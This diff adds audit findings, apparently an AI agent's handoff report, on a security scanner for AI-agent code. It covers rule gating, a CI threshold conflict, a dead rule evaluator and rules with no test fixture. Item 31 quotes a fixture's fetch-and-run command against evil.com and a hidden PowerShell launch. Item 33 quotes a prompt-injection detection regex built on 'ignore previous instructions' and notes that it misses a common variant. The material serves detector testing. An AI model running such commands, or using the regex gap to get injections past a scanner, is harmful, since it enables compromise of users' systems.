@@ -766,3 +766,200 @@ audit does not rediscover them:
 - `RULE_SUBSUMPTION_MAP` extended with `AGENT-034: [AGENT-047]`, same-line only.
 - No threshold, tier boundary, confidence value, ratchet, oracle, fixture or
   ground-truth label was changed.
+
+## NEEDS-HEADY (session 5)
+
+### 30. Gating AGENT-034 silences seven code-execution findings, one at BLOCK
+
+W20 wired `analysis/ts_tool_boundary_detector.py` as a hard gate on AGENT-034, as
+instructed. Measured effect on the audit target: noise **87 → 44**, high-value 20
+unchanged, recall 0/6 unchanged, Layer 1 TP 196 / FP 93 / FN 40 unchanged, AVB
+knowns unchanged. **No true positive is suppressed on either benchmark.**
+
+The cost is on the audit target and it is itemised rather than absorbed. 57
+AGENT-034 findings were removed. Their fates split three ways:
+
+| n | shape | what remains on that line |
+|---|---|---|
+| 14 | Shell Command Execution | **AGENT-047** "Subprocess Execution Without Sandbox" — `RULE_SUBSUMPTION_MAP` was suppressing it under AGENT-034, and releases it now |
+| 36 | Shell Command Execution | nothing |
+| 7 | **Dangerous Code Execution** | nothing |
+
+The 14 are arguably improved: AGENT-047 is the rule actually titled for subprocess
+execution and is not tool-scoped, so a shell call outside a tool handler now
+reports under the rule that describes it.
+
+**The 7 are the problem, and one deserves naming.** The largest single loss is
+
+```
+AGENT-034  Dangerous Code Execution   tier=BLOCK  confidence=0.95  severity=critical
+           return eval(expr)
+```
+
+`eval`, `new Function` and `vm.runInNewContext` are dangerous whether or not they
+sit inside a tool handler. The tool-boundary constraint comes from AGENT-034's
+definition as *"Tool Function Without Input Validation"* — a rule about unvalidated
+tool input. It does not follow that dynamic code execution stops mattering outside
+a tool. On the Python side that shape is reported under **AGENT-017 "Unsandboxed
+Code Execution"**, which has no tool-boundary gate at all.
+
+**The narrow fix is one line** — put only the shell-execution pattern types in
+`TOOL_SCOPED_RULES` and leave `ts_eval_exec` ungated. I did not take it, because
+which pattern types belong inside the gate *is* the gate's semantics, and the brief
+is explicit that semantics are your decision and not a nudge I make to avoid
+collateral damage. Three options:
+
+1. **Leave as landed.** Consistent with the published definition; loses 7 findings
+   including a BLOCK-tier `eval`.
+2. **Narrow the gate to shell execution.** Keeps the eval family. One-line change,
+   and the seven come back.
+3. **Split the rule** (RUN4's item 25 recommendation): give the TypeScript
+   code-execution emission AGENT-017's ID, or its own, and gate only what AGENT-034
+   is documented to cover.
+
+I recommend **3**, and **2** as the immediate step if 3 is not being done now.
+Under 1, agent-audit does not report `eval(expr)` in a TypeScript file that has no
+recognised tool entry point, which is a capability regression against a real RCE
+sink.
+
+### 31. The AGENT-120 fix turns a CI job red, through a gate nobody consolidated
+
+`d4d2850` makes AI-tool hook discovery recursive. Three findings become possible,
+all in `tests/fixtures/agent_architecture/vulnerable_hooks/` — a fixture written
+for AGENT-120, containing `powershell -WindowStyle Hidden` and
+`curl -s https://evil.com/payload.sh | bash`. All three are true positives by the
+rule's definition and by the fixture's own name. **The corpus labels none of
+them**: no label anywhere in `labeled_samples.yaml` cites AGENT-120 or
+`vulnerable_hooks`, across 81 labelled files. AGENT-120 shipped in v0.19.0 with
+zero ground-truth coverage.
+
+They therefore score as false positives. Layer 1 precision 0.6853 → 0.6782, F1
+0.7510 → 0.7467.
+
+That clears `gates.yaml` (`f1_min: 0.72`) and `quality_gate_check.py` exits 0. It
+does **not** clear `tests/benchmark/precision_recall.py:503`:
+
+```python
+if result.f1_score < 0.75:
+    sys.exit(1)
+```
+
+and `.github/workflows/benchmark.yml:33` runs that script with `continue-on-error`
+deliberately removed (line 37). So `pytest`-green, `quality_gate_check`-green, and
+the benchmark job red.
+
+**This is the two-gates contradiction again.** `gates.yaml` opens by declaring
+itself "THE SINGLE SOURCE OF TRUTH" and describes deleting the inline workflow gate
+because two gates on one layer is how a contradiction survived six months. The
+inline gate went; this hard-coded floor inside the script did not. Before this run
+F1 was 0.7510 — **one thousandth** above it.
+
+**I did not touch either threshold.** Lowering 0.75 is exactly what the `gates.yaml`
+header forbids ("Never lower them to make a build pass"), and it would also be a
+threshold change, which this run was told not to make. Three resolutions:
+
+1. **Label the three findings** (they are correct), which lifts F1 back over 0.75
+   on its own. This is ground truth, so it is yours.
+2. **Delete the `sys.exit(1)` from `precision_recall.py`** and let `gates.yaml` be
+   what its header says it is. This is the consolidation that was started and not
+   finished.
+3. Reconcile the two floors deliberately.
+
+I recommend **2 then 1**. 2 removes a second source of truth; 1 fixes the number.
+
+### 32. `RuleEngine.evaluate()` — retire it. Wiring it activates 3 of 84 blocks
+
+W21 measured both resolutions rather than arguing them. The scratch wiring was
+committed as `3f52f90` behind `AGENT_AUDIT_WIRE_YAML_RULES=1` and **reverted in
+`25636c3`**; nothing of it remains in the tree.
+
+**Why wiring does almost nothing, which is the decisive fact.** `_evaluate_rule`
+dispatches on `pattern.get('type')` and implements three branches: `python_ast`,
+`function_call`, `regex`. Across the 52 builtin YAML rules there are 84 pattern
+entries, and:
+
+```
+values of the 'type' key the evaluator dispatches on:
+  {'<MISSING>': 81, 'python_ast': 1, 'function_call': 1, 'regex': 1}
+```
+
+**81 of 84 entries have no `type` key at all.** They use `pattern_type`, which the
+evaluator never reads. The three that do dispatch belong to AGENT-001 (two) and
+AGENT-004 (one). So this is not a dormant mechanism waiting to be switched on; it
+is an evaluator that does not parse the dialect the rules are written in.
+
+**Measured delta, flag on vs. off at the same commit:**
+
+| | fixture corpus | Layer 1 TP | FP | FN | precision | F1 | audit target noise |
+|---|---|---|---|---|---|---|---|
+| off (shipping) | 291 findings | 196 | 93 | 40 | 0.6782 | 0.7467 | 44 |
+| on | 314 findings | **197** | **115** | **44** | **0.6314** | **0.7125** | 45 |
+
+Wiring costs **4.7 points of precision and 0.034 of F1, loses 4 true positives**, and
+gains 1. The +35 AGENT-001 findings largely duplicate lines already covered, and
+dedup/subsumption then removes the AGENT-034 and AGENT-047 findings that were
+matching labels — which is how wiring a rule engine manages to *reduce* recall.
+
+**Recommendation: retire.** Say in `CLAUDE.md` and `docs/ARCHITECTURE.md` that YAML
+carries rule metadata and detection lives in scanners, and mark `evaluate()` /
+`_evaluate_rule` as dead or delete them. The alternative — rewriting `_evaluate_rule`
+to parse `pattern_type` and the ~70 bespoke keys the YAML actually uses — is
+implementing 49 new rules from specifications nobody has validated, not wiring.
+
+**This is not cosmetic.** `CLAUDE.md`'s rule-authoring checklist instructs
+contributors to write those blocks, and `docs/ARCHITECTURE.md:134` draws
+`RuleEngine (evaluate)` as the box that runs them. Five of the six rules withdrawn
+in W19 are exactly what that instruction produces: a rule that is published,
+documented, tested at the YAML-loading level, and unable to fire. Whichever way this
+goes, the checklist must not survive unchanged.
+
+### 33. Twelve advertised rules have no fixture anywhere in the repository
+
+From the W19 producer audit. AGENT-002, 027, 037, 038, 039, 040, 042, 048, 052,
+055, 056, 057 all have working producers — each fires on a designed trigger built
+from its own source condition, transcripts in `NIGHT_RUN_LEDGER.md § W19.3` — and
+**no input in `tests/fixtures` reaches any of them.** Their only demonstration that
+they work is a hand-built trigger in that ledger.
+
+Two of them, AGENT-056 and AGENT-057, were recorded by RUN4 as *unreachable*
+mechanisms on the strength of a method with no callers. That method
+(`_detect_tool_poisoning`) is not the producer; `_check_tool_poisoning_in_config` is,
+and it runs on every config scan. The registry entry was wrong and is corrected.
+
+Worth a separate look while fixtures are being written:
+`analysis/tool_description_analyzer.py`'s injection regex is
+`ignore\s+(previous|all|above|prior)\s+(instructions?|rules?|constraints?)`, which
+requires the noun immediately after the first qualifier. It matches "ignore previous
+instructions" and **not** "ignore all previous instructions" — the more common
+phrasing, and the one RUN4's trigger used. The rule works; its best-known trigger
+string does not match it.
+
+Adding fixtures is corpus work and I did none of it.
+
+### 34. AGENT-054 is advertised but no scan can reach it
+
+`MCPBaselineManager` is constructed only in `cli/commands/inspect.py`. Drift
+detection compares a live server against a stored baseline, so no static input
+produces AGENT-054 during `agent-audit scan`. It is a real, working rule reachable
+through a different command, and it sits in `docs/RULES.md` beside 65 rules a scan
+does reach with nothing distinguishing it.
+
+Now disclosed in the Withdrawn Rules section of `docs/RULES.md` and pinned in
+`tests/test_rule_producers.py::SCAN_UNREACHABLE_BY_DESIGN` with a runtime check, so
+it fails if a scan ever starts producing it. No code change; the question of whether
+`inspect`-only rules should be listed with `scan` rules is yours.
+
+## Decisions taken (session 5, reversible, done)
+
+- `d4d2850` — AI-tool hook and `.mcp.json` discovery made recursive. AGENT-120 could
+  not fire below the scan root; sixth instance of the non-recursive-discovery defect.
+- `6adedd1` — six rules with no producer withdrawn from the advertised set, 72 → 66,
+  each with a stated reason in `WITHDRAWN_RULES` and in `docs/RULES.md`. IDs retired,
+  not recycled. No YAML rule definition was deleted, so item 32's measurement stands.
+- `2ee8345` — AGENT-034 gated on a tool entry point on the TypeScript path.
+  Membership only; `get_tool_confidence_boost` deliberately unused.
+- `3f52f90` / `25636c3` — W21 scratch wiring, committed for traceability and reverted.
+- `tests/test_rule_producers.py` added: an advertised rule with no producer fails the
+  suite, with no allow-list. `KNOWN_ORPHAN_RULES` in the RUN4 guard is now empty.
+- No threshold, tier boundary, confidence value, ratchet, oracle, fixture or
+  ground-truth label was changed.
